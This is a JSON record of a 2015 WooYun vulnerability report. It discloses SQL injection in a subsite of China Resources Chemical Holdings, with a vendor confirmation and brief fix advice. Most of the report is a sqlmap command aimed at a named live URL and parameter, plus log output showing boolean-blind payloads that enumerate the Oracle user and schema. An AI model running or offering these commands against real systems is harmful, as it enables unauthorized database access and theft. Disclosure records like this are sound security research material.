{"id": 84220, "wybug_id": "wooyun-2015-0145492", "wybug_title": "华润化工分站存在SQL注入漏洞", "wybug_corp": "华润化工控股有限公司", "wybug_author": "路人甲", "wybug_date": "2015-10-09 11:54", "wybug_open_date": "2015-11-24 14:50", "wybug_type": "SQL注射漏洞", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["注入"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-10-09：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-10-10：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-10-20：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-10-30：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-11-09：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-11-24：\t细节向公众公开  简要描述： 华润化工分站存在SQL注入漏洞 详细说明：  1.注入漏洞页面\nhttp://eip.crcchem.com/page/element/news/more.jsp?eid=4721\n2.payload\npython.exe sqlmap\\sqlmap.py -u \"http://eip.crcchem.com/page/element/news/more.jsp?eid=4721\" -v 3 --random-agent --dbs --current-user --no-cast --thread 10\n3.\nsqlmap identified the following injection points with a total of 0 HTTP(s) requsts:---Place: GETParameter: eid    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: eid=4721 AND 5245=5245    Vector: AND [INFERENCE]---[10:35:14] [INFO] the back-end DBMS is Oracleweb application technology: JSPback-end DBMS: Oracle[10:35:14] [INFO] fetching current user[10:35:14] [INFO] retrieving the length of query output[10:35:14] [INFO] resumed: 7[10:35:14] [DEBUG] performed 0 queries in 0.00 seconds[10:35:14] [INFO] resumed: ECOLOGY[10:35:14] [DEBUG] performed 0 queries in 0.00 secondscurrent user:    'ECOLOGY'[10:35:14] [WARNING] schema names are going to be used on Oracle for enumeratio as the counterpart to database names on other DBMSes[10:35:14] [INFO] fetching database (schema) names[10:35:14] [INFO] fetching number of databases[10:35:14] [PAYLOAD] 4721 AND ASCII(SUBSTRC((SELECT COUNT(DISTINCT(OWNER)) FROMSYS.ALL_TABLES),1,1))>51[10:35:14] [DEBUG] declared web page charset 'utf-8'[10:35:14] [PAYLOAD] 4721 AND ASCII(SUBSTRC((SELECT COUNT(DISTINCT(OWNER)) FROMSYS.ALL_TABLES),1,1))>48[10:35:14] [PAYLOAD] 4721 AND ASCII(SUBSTRC((SELECT COUNT(DISTINCT(OWNER)) FROMSYS.ALL_TABLES),1,1))>1[10:35:15] [INFO] retrieved:[10:35:15] [DEBUG] performed 3 queries in 0.98 seconds[10:35:15] [WARNING] in case of continuous data retrieval problems you are advied to try a switch '--no-cast' or switch '--hex'[10:35:15] [ERROR] unable to retrieve the number of databases[10:35:15] [INFO] falling back to current database[10:35:15] [INFO] fetching current database[10:35:15] [INFO] retrieving the length of query output[10:35:15] [INFO] resumed: 7[10:35:15] [DEBUG] performed 0 queries in 0.00 seconds[10:35:15] [INFO] resumed: ECOLOGY[10:35:15] [DEBUG] performed 0 queries in 0.02 seconds[10:35:15] [WARNING] on Oracle you'll need to use schema names for enumerations the counterpart to database names on other DBMSesavailable databases [1]:[*] ECOLOGY\n\n\n   漏洞证明：  \n\n   修复方案：  1.字符过滤2.删除不需要的页面   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：12  确认时间：2015-10-10 14:48 厂商回复： 感谢提交 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 12, "Ranks": null}